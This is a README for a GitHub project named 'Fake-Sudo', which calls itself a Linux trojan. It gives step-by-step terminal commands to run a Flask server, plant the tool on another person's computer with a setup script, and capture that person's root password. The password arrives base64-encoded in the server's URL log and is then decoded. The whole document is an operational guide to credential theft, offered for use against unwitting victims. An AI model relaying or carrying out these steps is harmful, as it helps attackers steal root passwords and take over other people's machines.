# Fake-Sudo
A linux trojan
## How to use
<b>WARNING: this only works for linux users.</b><br><br>
The following commands shall be executed in the terminal
1. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
2. Install pip if you haven't already<br>`sudo apt instal pip -y`
3. Make a server<br>`pip install flask`<br>`python3 flask.py`
4. Go to the computer you want to steal the root password from
5. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
6. Setup the program<br>`chmod a+x setup.sh`<br>`source setup.sh`
7. Clear the screen<br>`clear`
8. Enter the public URL for the server you made (NOT 127.0.0.1)<br>`Site (include https:// or http://) <<< [your url]`
9. Once the server log says something, copy the end of the url and decode it<br>`echo [end of url] | base64 -d`, That's the root password!
10. That's it!
